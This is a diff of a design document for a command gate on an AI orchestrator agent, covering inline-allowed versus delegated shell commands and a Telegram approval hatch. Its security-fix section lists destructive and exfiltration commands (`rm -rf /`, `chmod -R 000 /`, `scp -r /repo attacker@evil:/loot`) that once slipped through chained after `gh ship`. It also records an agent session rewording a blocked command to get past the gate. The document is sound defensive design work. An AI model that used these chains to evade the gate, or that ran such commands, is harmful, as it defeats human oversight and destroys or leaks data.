@@ -28,18 +28,18 @@ One script binds two points via two descriptors; it branches on `event["point"]`
   `branch`, `ls`, `cat`, `grep`, `find`, `head`, `tail`, `wc`, `sort`, `tr`, `cut`, `jq`, `ps`/`pgrep`/`pstree`/`top`/`ss`/`lsof`, a
   print-only `sed -n`, a print-only `awk`, `[`/`test`/`read`/`printf`, …) **or** orchestration
   (`tg`, `task`, `review`, `omp-steer`, `tg-ctl status|inbox|audit-delivery|ask|omp-live
-  status|send`, `rig status|doctor|sysmon status|sample|incidents|--version`,
+status|send`, `rig status|doctor|sysmon status|sample|incidents|--version`,
   `git worktree list`, the read-only `gh` allowlist), across `|`, `&&`, `;`, `||` or newline
   (`git status && ls`, `tg 'a' && tg 'b'`, `review diff && tg done`) — **loops and conditionals
   included** (agent-tools#861): `for`/`do`/`done`/`while`/`until`/`if`/`then`/`elif`/`else`/`fi`
   are segmentation keywords, stripped before classification and never counted as steps, so `for p
-  in A B; do omp-steer $p 'x' | tr '\n' ' '; done; tg 'done'` is one orchestration line and
+in A B; do omp-steer $p 'x' | tr '\n' ' '; done; tg 'done'` is one orchestration line and
   `for f in a b; do git commit -m x; done` is a `git commit` (the loop body's real head), not a
-  3-step chain. But a chain that merely *starts* allowed (`git status && sed -i ...`, `tg done &&
-  git commit`), or that mixes in any build/edit/heredoc segment, is judged on its **full**
+  3-step chain. But a chain that merely _starts_ allowed (`git status && sed -i ...`, `tg done &&
+git commit`), or that mixes in any build/edit/heredoc segment, is judged on its **full**
   content — not waved through on its prefix. Judgement is per-segment-**head**: a build token
   used only as an argument/needle of an allowed command (`cat tee.log`, `grep cargo notes`, `git
-  log | rg gh`) stays allowed; only a build/edit/commit/`gh` *at a segment head* counts.
+log | rg gh`) stays allowed; only a build/edit/commit/`gh` _at a segment head_ counts.
 
   **An orchestration carve-out never launders an unrecognized companion (agent-tools#861).** A
   segment granted by one of the explicit carve-outs (`tg`, `task`, `omp-steer`, `tg-ctl`, `rig`,
@@ -52,14 +52,12 @@ One script binds two points via two descriptors; it branches on `event["point"]`
 
   **The message names the rule (agent-tools#861).** Every WARN/BLOCK is five lines — `TRIGGER:`
   (the exact rule that fired, quoting the offending segment(s): `chain of 4 segments;
-  unrecognized heads: \`mkdir a\`, \`touch b\`, \`cp b c\` (+1 more)` / `implementation-shaped
-  segment: \`git commit -m x\`` / `sanctioned orchestration \`omp-steer 7 'x'\` chained with an
-  unrecognized command: \`rm -rf y\`` / `heredoc (<<) …` / `code write to \`<path>\``), `WHY:` (one
-  sentence), `DO THIS:` (the firing harness's own delegation recipe plus what IS allowed inline),
-  `EXCEPTION:` (the deny-by-default Telegram hatch). The previous single ~900-char paragraph
-  never said which rule fired; the supervisor session guessed a quoted substring had matched
-  `git commit`, reworded it (bypass-shaped) and was blocked again — the real cause was the then-
-  unknown `omp-steer` head tripping the chain-length fallback.
+unrecognized heads: \`mkdir a\`, \`touch b\`, \`cp b c\` (+1 more)`/`implementation-shaped
+  segment: \`git commit -m x\``/`sanctioned orchestration \`omp-steer 7 'x'\` chained with an
+  unrecognized command: \`rm -rf y\``/`heredoc (<<) …`/`code write to \`<path>\``), `WHY:`(one
+sentence),`DO THIS:`(the firing harness's own delegation recipe plus what IS allowed inline),`EXCEPTION:`(the deny-by-default Telegram hatch, role-aware: a coordinator relays to a subagent first and meets the hatch last; an unidentified reader gets both branches; agent-tools#994). The previous single ~900-char paragraph
+never said which rule fired; the supervisor session guessed a quoted substring had matched`git commit`, reworded it (bypass-shaped) and was blocked again — the real cause was the then-
+unknown `omp-steer` head tripping the chain-length fallback.
 
   **Read-only `sed` (agent-tools#541).** `sed` is not in the head-only `READ_ONLY_BASH` regex
   (a plain `sed\b` would also grant `sed -i` and `sed 'w file'`); instead `_is_read_only_sed`, a
@@ -67,7 +65,7 @@ One script binds two points via two descriptors; it branches on `event["point"]`
   `--in-place`, BSD `-I`), no script from a file (`-f`/`--file` — unknowable), and no script
   command that writes or executes (`w`/`W`/`e` at a command position, the `w`/`e` flags of an `s`
   command). So the literal #533/#541 incident chain `sed -n '1,240p' SKILL.md && git diff --check
-  && git status --short && git diff -- a.py` is inspection on the first call, for every harness,
+&& git status --short && git diff -- a.py` is inspection on the first call, for every harness,
   instead of falling to the >=3-segment fallback; `sed -i` keeps tripping `BUILD_EDIT` exactly as
   before. GRANT-direction, so every ambiguity (unbalanced quotes, a `-l` cluster whose GNU/BSD
   operand semantics differ, a script file, a shell-EXPANDED script — `sed -n "$S" f`,
@@ -81,7 +79,7 @@ One script binds two points via two descriptors; it branches on `event["point"]`
   **ALL `gh` is delegated (Alex tg#7103).** `gh ship`, `gh pr checks`/`view`, `gh run`, `gh api`
   — every gh subcommand — is implementation the orchestrator hands to a subagent, not inline work.
   This **reverts** the earlier `gh ship`/read-only-`gh` carve-out (agent-tools#159/#162): shipping
-  a gated PR *and* CI/PR verification are a subagent's job. `gh` is not in the allow-list; it is an
+  a gated PR _and_ CI/PR verification are a subagent's job. `gh` is not in the allow-list; it is an
   impl-signal, so an inline `gh ship 605` warn-then-blocks exactly like `git commit`. A dispatched
   subagent (`agent_id` present) is exempt and runs gh/ship freely — the gate governs the
   orchestrator only.
@@ -91,7 +89,7 @@ One script binds two points via two descriptors; it branches on `event["point"]`
   per-segment, the SAME tier `tg`/`task` get: `gh issue list`/`view`, `gh pr list`/`view`/`checks`/
   `diff`, `gh run list`/`view`/`watch`, `gh repo view`, and `gh api` carrying no non-GET method and
   no `-f`/`-F`/`--input` data-payload flag (`_is_gh_readonly_command`, table
-  `_GH_READONLY_SUBCOMMANDS`) are sanctioned CI/PR *inspection* the orchestrator may run inline.
+  `_GH_READONLY_SUBCOMMANDS`) are sanctioned CI/PR _inspection_ the orchestrator may run inline.
   `_is_gh_command`/`_seg_is_impl_signal` are DELIBERATELY left unchanged — every gh invocation,
   allowlisted shapes included, still trips them — so a chain that is not entirely composed of
   allowed segments still treats a gh-readonly segment as its own implementation signal; this
@@ -109,13 +107,13 @@ One script binds two points via two descriptors; it branches on `event["point"]`
   unblocked). `gh ship` with no PR number, `gh ship abc`, `gh ship <PR#>` sharing a line with
   ANYTHING else (even a trailing `| tail` or a leading `cd repo &&`), and every OTHER gh subcommand
   (`gh pr merge`, `gh run`, `gh pr checks`/`view`, `gh api`, …) still delegate — see "`gh ship
-  <PR#>` — restored narrow carve-out" below for the full matrix.
+<PR#>` — restored narrow carve-out" below for the full matrix.
 
   **UPDATE (Alex, direct Telegram authorization, agent-tools#159 thread): the `tg` carve-out is
   now formalized as an explicit predicate, replacing the old plain regex.** `tg` (send text,
   `--file`, `--photo`, `--format html`, `--tag`, `--reply-to`, `voice setup`, and every other
   tg-cli subcommand) has been sanctioned for the orchestrator since agent-tools#164 — scope
-  unchanged, and NOT narrowed like `gh ship` (Alex: *"все команды tg-cli"* / "ALL tg-cli commands",
+  unchanged, and NOT narrowed like `gh ship` (Alex: _"все команды tg-cli"_ / "ALL tg-cli commands",
   explicitly broader than the single-shape gh-ship exception). This revision REPLACES `ORCH_ALLOW`'s
   old plain `tg\b` regex with `_is_tg_command`, a shlex-based predicate consulted by
   `_seg_is_allowed` the same way `_is_gh_ship_command` is — allow-side only, since `tg` (unlike
@@ -147,9 +145,9 @@ exempts itself:
 This mirrors the opt-IN per-repo knob of the sibling `worktree-only-writes` guard.
 
 **`gh` is delegated, not carved out (Alex tg#7103 — reverts #159/#162).** An earlier design gave
-`gh ship` (and read-only `gh` reads) an *orchestrator* carve-out so the main thread could ship a
+`gh ship` (and read-only `gh` reads) an _orchestrator_ carve-out so the main thread could ship a
 gated PR and verify CI inline. The CTO reversed that: the orchestrator delegates **all** `gh` to a
-subagent — shipping *and* CI/PR verification included. So `gh ship`, `gh pr checks`/`view`,
+subagent — shipping _and_ CI/PR verification included. So `gh ship`, `gh pr checks`/`view`,
 `gh run`, `gh api` (GET or mutation) are each an impl-signal that warn-then-blocks for the
 orchestrator, single or chained, with or without `cd`/read-only plumbing (`gh ship 605 2>&1 | tail
 -30` blocks; a subagent runs it). Per-segment-head discipline is unchanged: `gh` as a
@@ -170,7 +168,7 @@ with no PR number, and `gh ship <PR#>` chained with anything else at all) is sti
 described above: an impl-signal that warn-then-blocks.
 
 **Report / verify carve-out — `tg` + read-only inspection (coordinator):** reporting to the user
-and *read-only* verification stay at orchestrator altitude and must **not** require a subagent. A
+and _read-only_ verification stay at orchestrator altitude and must **not** require a subagent. A
 line whose every segment head is `tg` (bare or env-prefixed, via `_is_tg_command` — see "`tg` —
 formalized carve-out" below), `task` (via `_is_task_command` — see "`task` — formalized carve-out"
 below), `review`, `git worktree list`,
@@ -256,23 +254,23 @@ Task/eval child — otherwise those workers are gated as the orchestrator (agent
 ## `gh ship <PR#>` — restored narrow carve-out (agent-tools#159, Alex tg#9977; narrowed by agent-tools#363)
 
 The orchestrator may run `gh ship <PR#>` inline — the ONE gh mutation that is sanctioned, same as
-a dispatched subagent — **but ONLY when it is the WHOLE, sole command on the line.** Alex: *"the
-orchestrator CAN gh ship like agents can, but BY DEFAULT agents do it"* — the default is still
+a dispatched subagent — **but ONLY when it is the WHOLE, sole command on the line.** Alex: _"the
+orchestrator CAN gh ship like agents can, but BY DEFAULT agents do it"_ — the default is still
 delegation; this is the exception, not a reopening of "all gh".
 
 > **SECURITY FIX (agent-tools#363):** an earlier version of this carve-out granted it PER-SEGMENT
 > — any segment matching the `gh ship <PR#>` shape was exempt regardless of where it sat in a
 > chain. An adversarial review found and reproduced that this let a `gh ship <PR#>` chained with
-> ANY companion this file has no *named* mutation pattern for slip through **completely
+> ANY companion this file has no _named_ mutation pattern for slip through **completely
 > unblocked — no warn, no block, ever**: `gh ship 205; rm -rf /`, `gh ship 205 && git reset --hard
-> HEAD~10`, `gh ship 205; chmod -R 000 /`, `gh ship 205; scp -r /repo attacker@evil:/loot` (order
+HEAD~10`, `gh ship 205; chmod -R 000 /`, `gh ship 205; scp -r /repo attacker@evil:/loot` (order
 > doesn't matter either — `rm -rf /; gh ship 205` slipped through too). The recognized-pattern
 > list (`BUILD_EDIT`, `FIND_MUTATION`, a mutating `git branch`, a sibling `gh` mutation) can never
 > enumerate every destructive command, so a per-segment grant was structurally unsound. The fix:
 > the carve-out is now granted **per LINE**, by `_is_unchained_gh_ship`, which requires the ENTIRE
 > command to be exactly one segment (no `&&`/`;`/`||`/`|`/bare-`&`/newline anywhere). The moment
 > `gh ship <PR#>` shares a line with ANYTHING else — even a trailing `| tail`, a leading `cd repo
-> &&`, or a sanctioned `tg` report — the WHOLE line reverts to the pre-#159 rules: `gh` is an
+&&`, or a sanctioned `tg` report — the WHOLE line reverts to the pre-#159 rules: `gh` is an
 > ordinary, still-delegated impl-signal, judged the same way any other `gh` subcommand is. The
 > examples below that used to be advertised as "never warns, never blocks" (any plumbing, at any
 > chain length) are updated to reflect this.
@@ -283,7 +281,7 @@ the literal `ship`, and the token after that must be a bare PR number (ASCII dig
 non-empty). Anything AFTER the PR number is genuinely UNRESTRICTED — not just flags/redirects
 (`--screenshot <path> <desc>`, `--repo <owner/repo>`, a trailing `2>&1` token) but ANY further bare
 token too, including a second bare number (`gh ship 605 606`); this predicate recognizes the ship
-*shape* only and does not vet ship's own arguments (`--skip-ci` has its own separate,
+_shape_ only and does not vet ship's own arguments (`--skip-ci` has its own separate,
 independently-gated live Telegram hatch inside `ci/ship/ship.sh` — this gate is not the place to
 duplicate that; a second PR number is refused downstream by `ship.sh`'s own arg parser — "the lone
 bare arg" — a second, independent gate this hook does not need to replicate). This predicate alone
@@ -291,6 +289,7 @@ is NOT the carve-out, though — see `_is_unchained_gh_ship` above for the whole
 actually decides whether it applies.
 
 **What matches (never warns, never blocks — genuinely UNCHAINED, no operators anywhere on the line):**
+
 - `gh ship 605`
 - `gh ship 605 --screenshot out.png "desc"`
 - `gh ship 605 --repo alex-mextner/agent-tools`
@@ -300,6 +299,7 @@ actually decides whether it applies.
 - `gtimeout 60 gh ship 605` (wrapper-stripped, same as any other command)
 
 **What does NOT match — falls through to the general `gh` deny, still warn-then-blocks:**
+
 - `gh ship` (no PR number)
 - `gh ship abc` / `gh ship --help` (non-numeric argument)
 - `gh ship $PR` / `gh ship "$PR_NUMBER"` — the hook sees the LITERAL pre-expansion text, so a
@@ -339,7 +339,7 @@ by a DIFFERENT sanctioned head (`tg`, `review`) with an unrecognized companion, 
 unrecognized command with no chain at all, still falls through to the file's pre-existing,
 unchanged default (see "`tg` — formalized carve-out" below for that boundary, deliberately not
 touched by this fix). A sanctioned, genuinely UNCHAINED segment's own argument TEXT merely
-*looking* like a mutation (`gh ship 605 tee`) does NOT block — `tee` there is inert text, never an
+_looking_ like a mutation (`gh ship 605 tee`) does NOT block — `tee` there is inert text, never an
 executed command, and the whole-line grant recognizes ship's argv shape, not "no mutation-shaped
 substring in the text". Nor does the substitution veto distinguish benign from mutating content —
 a previously-allowed BENIGN live substitution such as `gh ship 605 --note "$(date)"` now also
@@ -362,7 +362,7 @@ this gate grants inline.
 A SECOND, narrower exception to "ALL `gh` is delegated" (tg#7103): a fixed, explicit ALLOWLIST of
 gh shapes that are pure inspection — no state anywhere is ever mutated by running them — is
 sanctioned for the orchestrator to run inline. Session-authorized as a relaxation of the blanket
-gh gate specifically for read-only CI/PR *inspection*, not a reversal of the gate itself:
+gh gate specifically for read-only CI/PR _inspection_, not a reversal of the gate itself:
 «разрешить да, через rig это надо закрепить в хуке и белом списке» — "allow it, but codify
 it via the hook + an explicit allowlist."
 
@@ -371,13 +371,14 @@ grant.** `_is_gh_readonly_command` is consulted directly by `_seg_is_allowed`, a
 `_is_tg_command`/`_is_task_command`/`ORCH_ALLOW`. This is a deliberately different design from
 `gh ship <PR#>`: `_is_gh_command` (and therefore `_seg_is_impl_signal`) is left UNCHANGED here —
 every gh invocation, allowlisted shapes included, still trips it — so a chain that is not
-*entirely* composed of allowed segments still treats a gh-readonly segment as its own
+_entirely_ composed of allowed segments still treats a gh-readonly segment as its own
 implementation signal, closing off the exact "recognized-but-also-exempted-from-impl-signal"
 laundering hole agent-tools#363 fixed for `gh ship`. This grant only ever matters via the
 "ALL segments allowed" fast path in `_is_all_inline_allowed`.
 
 **The fixed table (`_GH_READONLY_SUBCOMMANDS`), a closed enumeration, not a heuristic — gh growing
 a new subcommand must NOT silently widen this grant:**
+
 - `gh issue list`, `gh issue view`
 - `gh pr list`, `gh pr view`, `gh pr checks`, `gh pr diff`
 - `gh run list`, `gh run view`, `gh run watch`
@@ -393,6 +394,7 @@ direction for a GRANT-direction predicate facing uncertain input.
 
 **What matches (never warns, never blocks, at any chain length when the WHOLE chain is
 allowlisted-gh/`tg`/read-only):**
+
 - `gh issue list`, `gh issue view 42`, `gh pr list`, `gh pr view 5`, `gh pr checks 5`, `gh pr diff 5`
 - `gh run list`, `gh run view 9`, `gh run watch 123`, `gh repo view`
 - `gh api repos/o/r/pulls` (bare — no method flag counts as GET)
@@ -401,6 +403,7 @@ allowlisted-gh/`tg`/read-only):**
 - `gh pr list && gh pr view 5`, `gh run list && gh run view 9 && tg 'done'` (chained allowlisted reads)
 
 **What does NOT match — falls through to the general `gh` deny, still warn-then-blocks:**
+
 - `gh pr merge`/`create`/`close`/`edit`/`checkout`, `gh issue create`/`close`/`edit`, `gh release`,
   `gh workflow`, `gh secret` — every mutating subcommand outside the fixed table
 - `gh ship` (bare or with a PR#) — deliberately absent from this table; it keeps its OWN, narrower,
@@ -425,7 +428,7 @@ grant only ever matters for the orchestrator.
 `tg` (the tg-cli Telegram reporting tool) has been sanctioned for the orchestrator to run inline
 since agent-tools#164 — every tg-cli subcommand, every flag. That stays **unchanged in scope**.
 Alex, asked directly whether the orchestrator should get the same `gh ship` treatment for `tg`,
-was explicit that `tg` should be **broader**, not narrower: *"оркестратор ещё и tg:* должен уметь,
+was explicit that `tg` should be **broader**, not narrower: _"оркестратор ещё и tg:_ должен уметь,
 т.е. все команды tg-cli"* — "the orchestrator should ALSO be able to run tg:*, i.e. ALL tg-cli
 commands". Unlike `gh ship <PR#>` (one gh mutation carved out of an otherwise-delegated command),
 `tg` has no subcommand this gate withholds — send text, `--file`, `--photo`, `--format html`,
@@ -472,6 +475,7 @@ entirely.
 
 **What matches (never warns, never blocks, AT ANY CHAIN LENGTH — broader than `gh ship <PR#>`,
 which is unchained-only since agent-tools#363; `tg`'s scope was never narrowed):**
+
 - `tg 'shipped'`, `tg --format html '<b>done</b>'`, `tg --file report.pdf 'caption'`
 - `tg --photo screenshot.png 'caption'`, `tg --tag report 'x'`, `tg --reply-to 12345 'answer'`
 - `tg voice setup`, `tg help format`
@@ -488,11 +492,11 @@ input, matching `_is_gh_ship_command`'s own fallback direction (the old regex's 
 fallback was justified only by parity with itself; once it became the sole authority that parity
 argument no longer applied).
 
-**Does not launder a *recognized* mutation elsewhere on the line** — `tg` keeps its ORIGINAL
+**Does not launder a _recognized_ mutation elsewhere on the line** — `tg` keeps its ORIGINAL
 per-segment design, deliberately UNCHANGED by agent-tools#363 (which touched only `gh ship`'s
 wiring, per the CTO's explicit scope: fix `gh ship`, don't touch `tg`): a `tg` call tacked onto an
 implementation chain does not exempt the rest of it — a build/edit (`sed -i … && tg 'done'`), a
-*recognized* companion mutation (`tg 'done' && git push`, `tg 'done' && npm run build`), a
+_recognized_ companion mutation (`tg 'done' && git push`, `tg 'done' && npm run build`), a
 mutation smuggled in a substitution (`tg done $(sed -i 's/a/b/' f)`), behind a bare `&` (`tg
 'done' & git push`), a sibling `gh` mutation, a `(...)` subshell group, or a heredoc anywhere still
 warn-then-blocks on the line's full content.
@@ -500,7 +504,7 @@ warn-then-blocks on the line's full content.
 **Known, PRE-EXISTING gap, not touched by agent-tools#363, not claimed fixed here — tracked as
 agent-tools#374:** `tg`'s per-segment grant has the SAME theoretical companion-mutation blind spot
 `gh ship` had before #363 — `tg` is allowed by `_seg_is_allowed` on its own segment; an
-*unrecognized* companion (one matching none of `BUILD_EDIT`/`FIND_MUTATION`/a mutating `git
+_unrecognized_ companion (one matching none of `BUILD_EDIT`/`FIND_MUTATION`/a mutating `git
 branch`/a sibling `gh` mutation, e.g. `rm`/`chmod`/`scp`/`mv`) in a 2-segment chain (`tg 'done'; rm
 -rf /`) falls through every check to allowed, for the identical structural reason `gh ship 205; rm
 -rf /` did. This is NOT new, NOT widened, and NOT closed by this PR — the adversarial review that
@@ -508,8 +512,8 @@ reported the `gh ship` regression separately confirmed this `tg` gap predates #3
 the fix was explicitly scoped to `gh ship` only; agent-tools#374 tracks the deferred decision
 (structural classifier-level fix vs. narrowing `tg` to per-line, pending Alex's call given `tg`'s
 any-chain-length scope was explicitly authorized). Chain-splitting makes a
-*recognized* mutation its OWN segment, and the substitution-liveness scanner catches a LIVE `$()`/backtick/
-`<()`/`>()` regardless of the outer segment's head. A `tg` argument's own TEXT merely *looking*
+_recognized_ mutation its OWN segment, and the substitution-liveness scanner catches a LIVE `$()`/backtick/
+`<()`/`>()` regardless of the outer segment's head. A `tg` argument's own TEXT merely _looking_
 like a mutation (`tg 'saw $(git push) in logs'`, single-quoted — literal, never executes) does NOT
 block — the pre-existing precedent, unchanged.
 
@@ -544,6 +548,7 @@ the same laundering resistance `tg-foo` gets), and deliberately NO path-qualific
 to place anywhere, and narrowing to absolute-paths-only narrows nothing real.
 
 **What matches (never warns, never blocks, at any chain length):**
+
 - `task new 'Fix the thing'`, `task list`, `task read 42`, `task find 'stale import'`
 - `task change 42 --status in-progress`, `task link 42 blocks 43`, `task check 42 --proof '…'`
 - `task accept 42`, `task gate 42`, `task done 42`, `task status 42 in-review`
@@ -579,10 +584,10 @@ token, `VAR=val` env-prefix skip, no path-qualification, deny on an unparseable 
 sharing the same companion-safety vetoes every carve-out has (chain-splitting, the bare-`&` split,
 the heredoc veto, the substitution-liveness scanner):
 
-| Predicate | Granted | NOT granted (stays delegated) |
-| --- | --- | --- |
-| `_is_omp_steer_command` | `omp-steer …` — any args (`list`, `<pid\|cwd\|all> 'text'`) | `omp-steer-foo`, `/path/omp-steer` |
-| `_is_tg_ctl_command` | `tg-ctl status\|inbox\|audit-delivery\|ask …`, `tg-ctl omp-live status\|send …` | `start`/`run`/`stop`/`restart`/`enable`/`disable`/`install-hooks`/`omp-live install`/anything else (`_TG_CTL_READONLY_SUBCOMMANDS`) |
+| Predicate                  | Granted                                                                                                                        | NOT granted (stays delegated)                                                                                                                                                                         |
+| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `_is_omp_steer_command`    | `omp-steer …` — any args (`list`, `<pid\|cwd\|all> 'text'`)                                                                    | `omp-steer-foo`, `/path/omp-steer`                                                                                                                                                                    |
+| `_is_tg_ctl_command`       | `tg-ctl status\|inbox\|audit-delivery\|ask …`, `tg-ctl omp-live status\|send …`                                                | `start`/`run`/`stop`/`restart`/`enable`/`disable`/`install-hooks`/`omp-live install`/anything else (`_TG_CTL_READONLY_SUBCOMMANDS`)                                                                   |
 | `_is_rig_readonly_command` | `rig status …`, `rig doctor` (no `--yes`/`--fix`/`--optional`), `rig sysmon status\|sample\|incidents …`, `rig --version`/`-h` | `rig apply`, `rig init`, `rig worktree create/remove/gc`, `rig config set`, `rig sysmon test-alert\|simulate\|restore`, `rig doctor --yes` (`_RIG_BARE_READONLY_SUBCOMMANDS` + per-subcommand tables) |
 
 `task` was already sanctioned (`_is_task_command`); `block-raw-ticket` identifies the same tool by
@@ -668,7 +673,7 @@ gate. Both were removed. (This is distinct from the per-repo **enable** knob
 constrained agent — sets to opt a repo out entirely; that stays.)
 
 The gate still **WARNs first**; only a would-be **BLOCK** (a repeat offense within the TTL
-window) is **deny-by-default**. For a genuine exception, ASK the human, or request a one-time
+window) is **deny-by-default**. For a genuine exception, relay via the coordinator, or as a last resort request a one-time
 Telegram approval with a written justification:
 
 ```bash
@@ -692,7 +697,7 @@ contact Telegram and denies — a bare `1` is not a justification. A real justif
 ButtonRequest on stdin; only a reply on stdout whose decision is explicitly `allow` allows — an
 empty or unparseable reply, an explicit deny, any nonzero exit, launch error, or timeout denies
 (`tg-ctl ask` exits 0 regardless of outcome, so a clean exit alone is never approval). An agent
-can *request*, not self-grant.
+can _request_, not self-grant.
 
 ## Fail-open, on purpose
 
